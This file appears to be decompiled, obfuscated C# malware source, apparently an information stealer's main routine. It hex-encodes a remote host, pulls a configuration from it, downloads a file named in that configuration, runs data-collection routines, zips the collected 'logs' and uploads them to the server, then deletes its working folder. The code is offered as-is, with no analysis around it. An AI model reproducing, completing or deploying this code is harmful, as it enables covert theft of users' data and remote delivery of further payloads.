using System;
using System.IO;
using System.Net;
using System.Text;
using ns14;
using ns16;
using ns17;
using ns18;
using ns19;
using ns29;
using ns31;
using ns32;
using ns34;
using ns35;
using ns37;
using ns38;
using ns40;

namespace ns15
{
	// Token: 0x02000020 RID: 32
	internal class Class8
	{
		// Token: 0x06000130 RID: 304 RVA: 0x0000A890 File Offset: 0x00008A90
		public static byte[] smethod_0(string string_0)
		{
			int length = string_0.Length;
			byte[] array = new byte[length / 2];
			for (int i = 0; i < length; i += 2)
			{
				array[i / 2] = Convert.ToByte(string_0.Substring(i, 2), 16);
			}
			return array;
		}

		// Token: 0x06000131 RID: 305 RVA: 0x0000A8D0 File Offset: 0x00008AD0
		private static void Main(string[] args)
		{
			Class9.smethod_0();
			Class9.smethod_1();
			Class9.smethod_2();
			string string_ = "ʰʷˉ˞˜ʷ˩˾ʰ˼ʷʰ˞ˉ˜ʷʰʷʷ˼ʰʷ˜ʰʷ˜ʰ˒ʷ˜ʰʰʰʨʷʰʷʰʷʰʨʷʰʷʰ˿˜˾˩˼ˣ˯˳˃˞˜ˏ˓˃˯˳˼ˣʩʩʩʷʷʷʷ";
			byte[] byte_ = Class8.smethod_0("687474703a2f2f67616d656670736275737465722e7275");
			byte[] bytes = Encoding.Default.GetBytes(Class11.smethod_2(string_));
			string @string = Encoding.Default.GetString(Class11.smethod_0(bytes, byte_));
			byte[] bytes2 = Encoding.Default.GetBytes(@string);
			GClass9.smethod_0();
			Class23.smethod_5(Class23.string_0);
			GClass9.smethod_1();
			string[] array = new StreamReader(WebRequest.Create(Encoding.Default.GetString(Class11.smethod_0(bytes, bytes2))).GetResponse().GetResponseStream()).ReadToEnd().Split(new char[]
			{
				','
			});
			bool flag = false;
			bool flag2 = false;
			bool flag3 = false;
			bool flag4 = false;
			bool flag5 = false;
			bool flag6 = false;
			bool flag7 = false;
			bool flag8 = false;
			bool flag9 = false;
			bool flag10 = false;
			bool flag11 = false;
			if (array[12] == "1")
			{
				flag8 = true;
			}
			if (!flag8)
			{
				Class12.smethod_5();
			}
			if (array[0] == "1")
			{
				flag = true;
			}
			if (array[1] == "1")
			{
				flag4 = true;
			}
			if (array[2] == "1")
			{
				flag5 = true;
			}
			if (array[3] == "1")
			{
				flag11 = true;
			}
			if (array[4] == "1")
			{
				flag2 = true;
			}
			if (array[5] == "1")
			{
				flag6 = true;
			}
			if (array[6] == "1")
			{
				flag10 = true;
			}
			if (array[7] == "1")
			{
				flag3 = true;
			}
			if (array[10] == "1")
			{
				flag9 = true;
			}
			if (array[11].StartsWith("http"))
			{
				flag7 = true;
			}
			if (flag7)
			{
				string text = array[11];
				string fileName = Path.GetFileName(text);
				Class20.smethod_0(text, fileName);
			}
			if (flag)
			{
				Class13.smethod_3();
				Class21.smethod_0();
			}
			if (flag5)
			{
				Class18.smethod_0();
			}
			if (flag7)
			{
				string text2 = array[11];
				string fileName2 = Path.GetFileName(text2);
				Class20.smethod_0(text2, fileName2);
			}
			if (flag2)
			{
				Class17.smethod_10();
			}
			if (flag6)
			{
				Class17.smethod_6();
			}
			if (flag4)
			{
				Class15.smethod_0();
				Class13.smethod_2();
				Class25.smethod_9();
			}
			if (flag11)
			{
				Class17.smethod_5(GClass9.string_2);
			}
			if (flag3)
			{
				foreach (string item in array[8].Split(new char[]
				{
					':'
				}))
				{
					Class17.list_0.Add(item);
				}
				Class17.int_0 = Convert.ToInt32(array[9]);
				Class17.int_0 *= 1024;
				Class17.smethod_8();
			}
			if (flag10)
			{
				Class17.smethod_9();
			}
			Class17.smethod_11();
			Class17.smethod_7();
			Class23.smethod_0();
			Class12.smethod_11();
			Class12.smethod_9();
			Class12.smethod_10();
			Class23.smethod_1();
			Class12.smethod_6();
			string string_2 = GClass9.string_0 + "\\" + Class23.string_0 + ".zip";
			try
			{
				Class27.smethod_0();
				Class27.smethod_1(Encoding.Default.GetString(Class11.smethod_0(bytes, bytes2)), string_2, "logs", "zip", Class27.nameValueCollection_0);
			}
			catch
			{
			}
			if (flag9)
			{
				Class12.smethod_7();
			}
			Class12.smethod_8();
			Directory.Delete(GClass9.string_6);
		}
	}
}
